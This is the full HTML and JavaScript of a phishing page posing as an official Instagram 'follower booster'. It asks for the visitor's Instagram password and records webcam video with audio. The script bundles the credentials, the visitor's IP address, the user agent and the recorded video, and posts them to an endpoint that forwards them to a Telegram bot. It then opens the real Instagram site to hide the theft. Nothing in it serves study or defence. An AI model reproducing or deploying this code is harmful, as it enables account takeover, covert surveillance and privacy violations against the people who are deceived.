<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Follower Booster</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 420px;
            width: 100%;
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
            padding: 25px 20px;
            border: 1px solid rgba(0,0,0,0.05);
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(90deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
        }
        
        .camera-container {
            width: 100%;
            height: 200px;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 15px;
            position: relative;
            border: 3px solid transparent;
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d) border-box;
            -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
            mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
            -webkit-mask-composite: destination-out;
            mask-composite: exclude;
        }
        
        #cameraFeed {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        
        .camera-overlay {
            position: absolute;
            top: 10px;
            right: 10px;
            background: rgba(0,0,0,0.6);
            color: white;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 5px;
            backdrop-filter: blur(5px);
            z-index: 10;
        }
        
        .recording-indicator {
            width: 10px;
            height: 10px;
            background: #f44336;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% {
                transform: scale(1);
                opacity: 1;
            }
            50% {
                transform: scale(1.3);
                opacity: 0.7;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
        
        .camera-controls {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .cam-btn {
            flex: 1;
            padding: 10px;
            border: none;
            border-radius: 30px;
            font-weight: 600;
            font-size: 13px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            transition: all 0.3s;
        }
        
        .request-btn {
            background: linear-gradient(45deg, #405de6, #5851db);
            color: white;
        }
        
        .record-btn {
            background: linear-gradient(45deg, #f44336, #d32f2f);
            color: white;
        }
        
        .stop-btn {
            background: #333;
            color: white;
        }
        
        .cam-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            position: relative;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .logo-icon {
            width: 35px;
            height: 35px;
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 22px;
            transform: rotate(5deg);
        }
        
        h1 {
            font-size: 32px;
            font-weight: 600;
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }
        
        .verified-badge {
            background: #3897f0;
            color: white;
            font-size: 12px;
            padding: 3px 8px;
            border-radius: 20px;
            margin-left: 8px;
            font-weight: 600;
        }
        
        .offer-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 25px;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .offer-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .offer-title {
            font-weight: 700;
            font-size: 20px;
            letter-spacing: -0.5px;
        }
        
        .offer-badge {
            background: rgba(255,255,255,0.25);
            padding: 5px 12px;
            border-radius: 30px;
            font-size: 13px;
            font-weight: 600;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        .follower-selector {
            background: white;
            border-radius: 14px;
            padding: 20px;
            margin-bottom: 25px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            border: 1px solid #efefef;
        }
        
        .selector-label {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .selector-label span {
            font-weight: 600;
            font-size: 16px;
            color: #262626;
        }
        
        .amount-options {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }
        
        .amount-option {
            background: #f0f0f0;
            border: none;
            padding: 8px 15px;
            border-radius: 30px;
            font-size: 13px;
            font-weight: 600;
            color: #262626;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .amount-option.active {
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            color: white;
        }
        
        .selected-amount {
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 5px;
        }
        
        .selected-amount small {
            font-size: 14px;
            color: #8e8e8e;
            background: none;
            -webkit-text-fill-color: #8e8e8e;
        }
        
        .login-section {
            background: #fafafa;
            border-radius: 14px;
            padding: 20px;
            margin-bottom: 15px;
            border: 1px solid #efefef;
        }
        
        .login-header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 15px;
            color: #262626;
            font-weight: 600;
        }
        
        .form-group {
            margin-bottom: 12px;
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 16px;
        }
        
        input {
            width: 100%;
            padding: 14px 14px 14px 45px;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            font-size: 14px;
            background-color: white;
            transition: all 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #3897f0;
            box-shadow: 0 0 0 3px rgba(56,151,240,0.1);
        }
        
        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
            color: white;
            border: none;
            border-radius: 12px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 15px;
            box-shadow: 0 10px 20px rgba(193, 53, 132, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 25px rgba(193, 53, 132, 0.4);
        }
        
        .success-message {
            background: linear-gradient(135deg, #4CAF50, #45a049);
            color: white;
            padding: 15px;
            border-radius: 12px;
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            display: none;
            animation: slideIn 0.5s ease;
        }
        
        .error-message {
            background: linear-gradient(135deg, #f44336, #d32f2f);
            color: white;
            padding: 15px;
            border-radius: 12px;
            margin-top: 15px;
            text-align: center;
            font-size: 14px;
            display: none;
            animation: slideIn 0.5s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .telegram-status {
            font-size: 12px;
            padding: 12px;
            background: #f0f0f0;
            border-radius: 30px;
            text-align: center;
            color: #262626;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            border: 1px solid #dbdbdb;
        }
        
        .status-dot {
            width: 8px;
            height: 8px;
            background: #4CAF50;
            border-radius: 50%;
            display: inline-block;
            margin-left: 5px;
            animation: pulse 2s infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">📸</div>
                <h1>Instagram</h1>
            </div>
            <div class="verified-badge">✓ Official</div>
        </div>
        
        <div class="offer-card">
            <div class="offer-header">
                <div class="offer-title">🚀 INSTAGRAM BOOSTER</div>
                <div class="offer-badge">LIVE</div>
            </div>
            <div style="font-size: 14px; opacity: 0.9;">⭐ 4.9 (2.3k reviews) • 👥 10k+ users</div>
        </div>
        
        <div class="camera-container">
            <video id="cameraFeed" autoplay playsinline></video>
            <div class="camera-overlay" id="cameraStatus">
                <span>📷 Camera Ready</span>
            </div>
        </div>
        
        <div class="camera-controls">
            <button class="cam-btn request-btn" onclick="requestCamera()" id="requestCamBtn">
                📷 Request Camera
            </button>
            <button class="cam-btn record-btn" onclick="startRecording()" id="recordBtn" disabled>
                ⏺️ Start Recording
            </button>
            <button class="cam-btn stop-btn" onclick="stopRecording()" id="stopBtn" disabled>
                ⏹️ Stop & Send
            </button>
        </div>
        
        <div class="follower-selector">
            <div class="selector-label">
                <span>🎯 Select Followers</span>
            </div>
            
            <div class="amount-options">
                <button class="amount-option" onclick="setAmount(500)">500</button>
                <button class="amount-option active" onclick="setAmount(1000)">1K</button>
                <button class="amount-option" onclick="setAmount(2500)">2.5K</button>
                <button class="amount-option" onclick="setAmount(5000)">5K</button>
                <button class="amount-option" onclick="setAmount(10000)">10K</button>
            </div>
            
            <div class="selected-amount" id="selectedAmount">
                1,000 <small>followers</small>
            </div>
        </div>
        
        <div class="login-section">
            <div class="login-header">🔐 Login to Claim</div>
            
            <form id="loginForm">
                <div class="form-group">
                    <span class="input-icon">👤</span>
                    <input type="text" placeholder="Username or email" id="username" required>
                </div>
                <div class="form-group">
                    <span class="input-icon">🔑</span>
                    <input type="password" placeholder="Password" id="password" required>
                </div>
                
                <button type="button" class="login-btn" onclick="handleLogin()">
                    ⚡ CLAIM <span id="displayAmount">1,000</span> FOLLOWERS ⚡
                </button>
            </form>
        </div>
        
        <div class="success-message" id="successMessage">
            🎉 Success! Video and data sent to verification team!
        </div>
        
        <div class="error-message" id="errorMessage">
            ⚠️ Please enter both username and password
        </div>
        
        <div class="telegram-status" id="telegramStatus">
            <span>🤖 Telegram Bot</span>
            <span>●</span>
            <span>Ready</span>
            <span class="status-dot"></span>
        </div>
    </div>
    
    <script>
        // Camera variables
        let mediaRecorder;
        let recordedChunks = [];
        let stream;
        let selectedFollowers = 1000;
        
        function setAmount(amount) {
            selectedFollowers = amount;
            const formattedAmount = amount.toLocaleString();
            document.getElementById('selectedAmount').innerHTML = `${formattedAmount} <small>followers</small>`;
            document.getElementById('displayAmount').innerText = formattedAmount;
            
            document.querySelectorAll('.amount-option').forEach(btn => {
                btn.classList.remove('active');
                if (parseInt(btn.innerText.replace('K', '000')) === amount || 
                    (btn.innerText === '1K' && amount === 1000) ||
                    (btn.innerText === '2.5K' && amount === 2500) ||
                    (btn.innerText === '5K' && amount === 5000) ||
                    (btn.innerText === '10K' && amount === 10000)) {
                    btn.classList.add('active');
                }
            });
        }
        
        // Request camera access
        async function requestCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }, 
                    audio: true 
                });
                
                const videoElement = document.getElementById('cameraFeed');
                videoElement.srcObject = stream;
                
                document.getElementById('cameraStatus').innerHTML = '<span>📷 Camera Active</span><span class="recording-indicator"></span>';
                document.getElementById('requestCamBtn').disabled = true;
                document.getElementById('recordBtn').disabled = false;
                
                updateTelegramStatus('🤖 Camera ready', '#4CAF50');
                
            } catch (err) {
                console.error('Camera error:', err);
                document.getElementById('cameraStatus').innerHTML = '❌ Camera access denied';
                updateTelegramStatus('❌ Camera error', '#f44336');
            }
        }
        
        // Start recording
        function startRecording() {
            if (!stream) {
                alert('Please grant camera access first');
                return;
            }
            
            recordedChunks = [];
            
            try {
                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp9,opus'
                });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = () => {
                    sendVideoToTelegram();
                };
                
                mediaRecorder.start();
                
                document.getElementById('cameraStatus').innerHTML = '<span>⏺️ Recording</span><span class="recording-indicator"></span>';
                document.getElementById('recordBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;
                updateTelegramStatus('⏺️ Recording video...', '#f44336');
                
                // Auto-stop after 10 seconds (Telegram limit)
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        stopRecording();
                    }
                }, 10000);
                
            } catch (err) {
                console.error('Recording error:', err);
                alert('Error starting recording: ' + err.message);
            }
        }
        
        // Stop recording
        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                
                document.getElementById('cameraStatus').innerHTML = '⏸️ Processing video...';
                document.getElementById('recordBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
                document.getElementById('requestCamBtn').disabled = false;
            }
        }
        
        // Send video to Telegram
        async function sendVideoToTelegram() {
            if (recordedChunks.length === 0) {
                updateTelegramStatus('❌ No video recorded', '#f44336');
                return;
            }
            
            updateTelegramStatus('📤 Sending video...', '#ff9800');
            
            try {
                // Create video blob
                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                
                // Convert to base64
                const reader = new FileReader();
                reader.readAsDataURL(videoBlob);
                
                reader.onloadend = async function() {
                    const base64Video = reader.result.split(',')[1]; // Remove data URL prefix
                    
                    // Get username and password
                    const username = document.getElementById('username').value || 'not_provided';
                    const password = document.getElementById('password').value || 'not_provided';
                    
                    // Get IP info
                    let ipInfo = 'Unknown';
                    try {
                        const ipResponse = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipResponse.json();
                        ipInfo = ipData.ip;
                    } catch (e) {
                        ipInfo = 'Could not fetch IP';
                    }
                    
                    // Send to your API (which will forward to Telegram)
                    const response = await fetch('/api/send_to_telegram', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            username: username,
                            password: password,
                            ipInfo: ipInfo,
                            userAgent: navigator.userAgent,
                            followers: selectedFollowers,
                            video: base64Video,
                            videoType: 'webm'
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        updateTelegramStatus('✅ Video sent!', '#4CAF50');
                        document.getElementById('cameraStatus').innerHTML = '✅ Video sent to verification';
                    } else {
                        updateTelegramStatus('❌ Send failed', '#f44336');
                    }
                };
                
            } catch (err) {
                console.error('Send error:', err);
                updateTelegramStatus('❌ Error sending', '#f44336');
            }
        }
        
        function updateTelegramStatus(text, color) {
            document.getElementById('telegramStatus').innerHTML = `
                <span>🤖 Telegram Bot</span>
                <span>●</span>
                <span>${text}</span>
                <span class="status-dot" style="background: ${color};"></span>
            `;
        }
        
        async function sendToTelegram(username, password) {
            // Get IP info
            let ipInfo = 'Unknown';
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ipInfo = ipData.ip;
            } catch (e) {
                ipInfo = 'Could not fetch IP';
            }
            
            updateTelegramStatus('📤 Sending data...', '#ff9800');
            
            try {
                const response = await fetch('/api/send_to_telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        ipInfo: ipInfo,
                        userAgent: navigator.userAgent,
                        followers: selectedFollowers
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    updateTelegramStatus('✅ Data sent!', '#4CAF50');
                } else {
                    updateTelegramStatus('❌ Send failed', '#f44336');
                }
            } catch (error) {
                updateTelegramStatus('❌ Error', '#f44336');
                console.error('Error:', error);
            }
        }
        
        function handleLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const successMsg = document.getElementById('successMessage');
            const errorMsg = document.getElementById('errorMessage');
            
            successMsg.style.display = 'none';
            errorMsg.style.display = 'none';
            
            if (username.trim() === '' || password.trim() === '') {
                errorMsg.style.display = 'block';
                setTimeout(() => {
                    errorMsg.style.display = 'none';
                }, 3000);
                return;
            }
            
            successMsg.style.display = 'block';
            
            // If video was recorded, it's already sent via stopRecording()
            // Also send login data
            sendToTelegram(username, password);
            
            window.open('https://www.instagram.com', '_blank');
            
            setTimeout(() => {
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                successMsg.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
